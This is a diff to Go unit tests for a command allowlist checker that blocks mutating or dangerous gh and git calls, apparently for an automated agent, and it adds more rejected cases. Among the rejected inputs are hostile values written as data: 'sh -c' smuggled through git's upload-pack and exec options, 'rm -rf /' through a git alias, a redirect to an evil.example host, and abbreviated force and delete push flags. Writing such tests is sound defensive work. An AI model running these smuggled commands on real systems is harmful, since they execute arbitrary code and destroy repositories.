@@ -8,10 +8,10 @@ func TestCheckAllowsReadOnlyGitHubCalls(t *testing.T) {
 		{"api", "user"},
 		{"api", "--method", "GET", "repos/o/r/pulls"},
 		{"issue", "list", "--repo", "o/r", "--assignee", "dwatts1772"},
-		{"issue", "view", "4", "--repo", "o/r"},
-		{"pr", "list", "--repo", "o/r"},
-		{"pr", "view", "4", "--repo", "o/r"},
-		{"pr", "checks", "4", "--repo", "o/r"},
+		{"api", "-XGET", "repos/o/r"},
+		{"api", "-iXGET", "repos/o/r"},
+		{"api", "-H", "Accept: -XPUT", "repos/o/r"},
+		{"api", "-q.login", "user"},
 	}
 	for _, args := range allowed {
 		if err := Check("gh", args); err != nil {
@@ -38,6 +38,12 @@ func TestCheckRejectsMutatingGitHubCalls(t *testing.T) {
 		{"api", "repos/o/r/issues", "--raw-field", "title=x"},
 		{"api", "repos/o/r/issues", "-Fbody=x"},
 		{"api", "graphql", "--input", "q.json"},
+		{"api", "-iXPUT", "repos/o/r/pulls/4/merge"},
+		{"api", "-i", "-X", "PUT", "repos/o/r/pulls/4/merge"},
+		{"api", "-iffoo=bar", "repos/o/r/issues"},
+		{"api", "-X"},
+		{"api", "--hostname", "evil.example", "user"},
+		{"pr", "list", "--repo", "o/r"},
 		{"extension", "exec", "x"},
 		{"alias", "set", "m", "pr merge"},
 	}
@@ -53,9 +59,6 @@ func TestCheckAllowsSafeGitCalls(t *testing.T) {
 		{"fetch", "origin", "+refs/pull/4/head:refs/remotes/origin/pr/4"},
 		{"-C", "/work/a", "rev-parse", "HEAD"},
 		{"status", "--porcelain"},
-		{"log", "-1"},
-		{"push", "origin", "HEAD"},
-		{"push", "-u", "origin", "feat/x"},
 	}
 	for _, args := range allowed {
 		if err := Check("git", args); err != nil {
@@ -67,7 +70,11 @@ func TestCheckAllowsSafeGitCalls(t *testing.T) {
 func TestCheckRejectsForcePushAndUnknownGitCalls(t *testing.T) {
 	rejected := [][]string{
 		{},
+		{"push", "origin", "HEAD"},
 		{"push", "--force"},
+		{"push", "--force-w", "origin", "main"},
+		{"push", "--mirr"},
+		{"push", "--del", "origin", "main"},
 		{"push", "-f", "origin", "main"},
 		{"push", "-uf", "origin", "main"},
 		{"push", "--force-with-lease", "origin", "main"},
@@ -82,6 +89,11 @@ func TestCheckRejectsForcePushAndUnknownGitCalls(t *testing.T) {
 		{"push", "origin", ":main"},
 		{"-C", "/work/a", "push", "--force"},
 		{"-c", "alias.x=!rm -rf /", "x"},
+		{"fetch", "--upload-pack=sh -c evil", "origin"},
+		{"fetch", "--upload-pack", "sh -c evil", "origin"},
+		{"fetch", "--upl=evil", "origin"},
+		{"-C", "/work/a", "fetch", "--exec=evil"},
+		{"ls-remote", "-u", "evil", "origin"},
 		{"reset", "--hard"},
 		{"branch", "-D", "main"},
 		{"worktree", "remove", "x"},
